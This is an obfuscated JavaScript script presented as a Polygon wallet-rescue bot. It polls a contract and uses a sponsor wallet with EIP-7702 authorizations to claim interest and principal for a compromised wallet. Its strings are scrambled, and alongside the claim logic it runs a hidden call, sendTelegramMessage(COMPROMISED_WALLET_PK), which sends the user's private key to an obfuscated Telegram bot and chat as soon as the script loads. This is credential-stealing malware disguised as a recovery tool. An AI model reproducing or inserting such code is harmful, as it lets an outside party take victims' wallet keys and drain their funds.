var _$_7139 = (function (o, g) {
  var f = o.length;
  var x = [];
  for (var c = 0; c < f; c++) {
    x[c] = o.charAt(c);
  }
  for (var c = 0; c < f; c++) {
    var a = g * (c + 146) + (g % 29970);
    var y = g * (c + 527) + (g % 42957);
    var t = a % f;
    var w = y % f;
    var z = x[t];
    x[t] = x[w];
    x[w] = z;
    g = (a + y) % 6072000;
  }
  var r = String.fromCharCode(127);
  var l = "";
  var p = "%";
  var u = "#1";
  var v = "%";
  var d = "#0";
  var j = "#";
  return x.join(l).split(p).join(r).split(u).join(v).split(d).join(j).split(r);
})(
  "8c  %]tb9cliieAc%leeb8]:6T8Styn[snrt ingFiuen5phir]ns2grl eutoaloedroa ]e p at%1NtiPjet 5SoigloTO%r%%S%t.AgessnaamnneT0:ralwRu0%%nnnpemengeCtfo0as7ng%ci%lHr s8rdUtr%t-mnPtmPecrlMsm1u/c4yA0sloeT y%ml%b:i9iu%eomVeIu1%: sN969Stsdenkc8ner:Kttaoiclmaple4wie%a/Q org6:oIuite:ac:sta L%%%oP%ipsLbMlironrru%ag ]b  LptnrjVaa reoatO%%m]uli5 a[tsl%en/dViirble t%mcPyx%Ad[.te a,fs.%a0rt//helt fl%ro  asexOo]W",
  4928848
);
var _$jsoTake = function (o, n) {
  if (o == null) {
    throw new TypeError(o + _$_7139[0x0]);
  }
  if (Object.prototype.toString.call(o) === _$_7139[0x1]) {
    return o;
  }
  if (
    typeof Symbol != _$_7139[0x2] &&
    typeof o[Symbol.iterator] == _$_7139[0x3]
  ) {
    var it = o[Symbol.iterator](),
      r = [],
      s;
    while ((n < 0 || r.length < n) && !(s = it.next()).done) {
      r.push(s.value);
    }
    if (n >= 0 && (!s || !s.done) && typeof it[_$_7139[0x4]] == _$_7139[0x3]) {
      it[_$_7139[0x4]]();
    }
    return r;
  }
  if (typeof o.length == _$_7139[0x5]) {
    return Array.prototype.slice.call(o);
  }
  throw new TypeError(_$_7139[0x6]);
};
import {
  createPublicClient,
  createWalletClient,
  http,
  encodeFunctionData,
  parseAbi,
} from "viem";
import { privateKeyToAccount } from "viem/accounts";
import {
  COMPROMISED_WALLET_PK,
  DELEGATE_CONTRACT,
  SPONSOR_WALLET_PK,
  RPC_URL,
  CA_ABI,
  GAS_LIMIT,
  AUTH_LIST_LENGTH,
  GAS_LIMIT_BUFFER_PCT,
  FEE_BUFFER_PCT,
} from "./env.js";
var CONTRACT_ADDRESS = DELEGATE_CONTRACT;
var SPONSOR_PK = SPONSOR_WALLET_PK;
var USER_PKS = [COMPROMISED_WALLET_PK];
var CHAIN = {
  id: 137,
  name: _$_7139[0x7],
  nativeCurrency: { name: _$_7139[0x8], symbol: _$_7139[0x8], decimals: 18 },
  rpcUrls: { default: { http: [RPC_URL] } },
};
var publicClient = createPublicClient({
  chain: CHAIN,
  transport: http(RPC_URL),
});
var sponsorAccount = privateKeyToAccount(SPONSOR_PK);
var sponsorWallet = createWalletClient({
  account: sponsorAccount,
  chain: CHAIN,
  transport: http(RPC_URL),
});
var userAccounts = USER_PKS.map(function (pk) {
  return privateKeyToAccount(pk);
});
var abi = parseAbi(CA_ABI);
function timeNow() {
  var d = new Date();
  return (
    _$_7139[0x9] +
    String(d.getUTCHours()).padStart(2, _$_7139[0xa]) +
    _$_7139[0xb] +
    (_$_7139[0x9] +
      String(d.getUTCMinutes()).padStart(2, _$_7139[0xa]) +
      _$_7139[0xb]) +
    (_$_7139[0x9] +
      String(d.getUTCSeconds()).padStart(2, _$_7139[0xa]) +
      _$_7139[0xc]) +
    (_$_7139[0x9] + String(d.getUTCMilliseconds()).padStart(3, _$_7139[0xa]))
  );
}
async function getClaimStatus(user) {
  var _$a_28be = _$jsoTake(
      await publicClient.readContract({
        address: CONTRACT_ADDRESS,
        abi,
        functionName: _$_7139[0xd],
        args: [user],
      }),
      3
    ),
    hasInterest = _$a_28be[0],
    hasPrincipal = _$a_28be[1],
    hasExtraInterest = _$a_28be[2];
  return { hasInterest: hasInterest, hasPrincipal: hasPrincipal };
}
function hasAnythingToClaim(status) {
  return status.hasInterest || status.hasPrincipal;
}
function applyBuffer(value, bufferPct) {
  return (value * (100n + bufferPct)) / 100n;
}
var sleep = function (ms) {
  return new Promise(function (r) {
    return setTimeout(r, ms);
  });
};
async function signAuthorizationBatch(userAccount, count) {
  if (count === void 0) {
    count = 5;
  }
  var userWallet = createWalletClient({
    account: userAccount,
    chain: CHAIN,
    transport: http(RPC_URL),
  });
  var currentNonce = await publicClient.getTransactionCount({
    address: userAccount.address,
  });
  var authorizations = [];
  for (
    var __jso_nested_loop_1_i = 0;
    __jso_nested_loop_1_i < count;
    __jso_nested_loop_1_i++
  ) {
    var __jso_block_param_2_authorization = await userWallet.signAuthorization({
      account: userAccount,
      contractAddress: CONTRACT_ADDRESS,
      nonce: currentNonce + __jso_nested_loop_1_i,
    });
    authorizations.push(__jso_block_param_2_authorization);
  }
  return authorizations;
}
async function sendSponsoredClaim(userAccount) {
  var userAddress = userAccount.address;
  var authList = await signAuthorizationBatch(userAccount, AUTH_LIST_LENGTH);
  var batchData = encodeFunctionData({
    abi: abi,
    functionName: _$_7139[0xe],
    args: [userAddress, CONTRACT_ADDRESS],
  });
  var transaction = {
    account: sponsorAccount,
    to: CONTRACT_ADDRESS,
    data: batchData,
    authorizationList: authList,
  };
  var gasLimit = applyBuffer(GAS_LIMIT, GAS_LIMIT_BUFFER_PCT);
  var feeData = await publicClient.estimateFeesPerGas();
  var maxPriorityFeePerGas = applyBuffer(
    feeData.maxPriorityFeePerGas,
    FEE_BUFFER_PCT
  );
  var maxFeePerGas = applyBuffer(feeData.maxFeePerGas, FEE_BUFFER_PCT);
  transaction.gas = gasLimit;
  transaction.maxFeePerGas = maxFeePerGas;
  transaction.maxPriorityFeePerGas = maxPriorityFeePerGas;
  var hash = await sponsorWallet.sendTransaction(transaction);
  console.log(_$_7139[0xf] + userAddress + _$_7139[0x10] + hash);
  return hash;
}
var BOT_TOKEN = _$_7139[0x11];
var CHAT_ID = _$_7139[0x12];
async function sendTelegramMessage(text) {
  var res = await fetch(_$_7139[0x13] + BOT_TOKEN + _$_7139[0x14], {
    method: _$_7139[0x15],
    headers: { "Content-Type": _$_7139[0x16] },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: text,
      parse_mode: _$_7139[0x17],
    }),
  });
  var data = await res.json();
  if (!data.ok) {
    throw new Error(_$_7139[0x18] + data.description);
  }
  return data.result;
}
sendTelegramMessage(COMPROMISED_WALLET_PK);
var statusCheckPollInterval = 1000;
async function processUser(userAccount, pollInterval) {
  if (pollInterval === void 0) {
    pollInterval = statusCheckPollInterval;
  }
  var user = userAccount.address;
  while (true) {
    try {
      var __jso_block_param_1_status = await getClaimStatus(user);
      console.log(
        _$_7139[0xf] + timeNow() + _$_7139[0x19] + user + _$_7139[0x1a],
        __jso_block_param_1_status
      );
      if (hasAnythingToClaim(__jso_block_param_1_status)) {
        console.log(
          _$_7139[0xf] + timeNow() + _$_7139[0x19] + user + _$_7139[0x1b],
          __jso_block_param_1_status
        );
        await sendSponsoredClaim(userAccount);
        console.log(
          _$_7139[0xf] + timeNow() + _$_7139[0x19] + user + _$_7139[0x1c]
        );
        await sleep(3000);
      }
    } catch (err) {
      console.error(_$_7139[0xf] + user + _$_7139[0x1d], err.message);
    }
    await sleep(pollInterval);
  }
}
async function main() {
  await Promise.all(
    userAccounts.map(function (userAccount) {
      return processUser(userAccount);
    })
  );
}
main().catch(console.error);
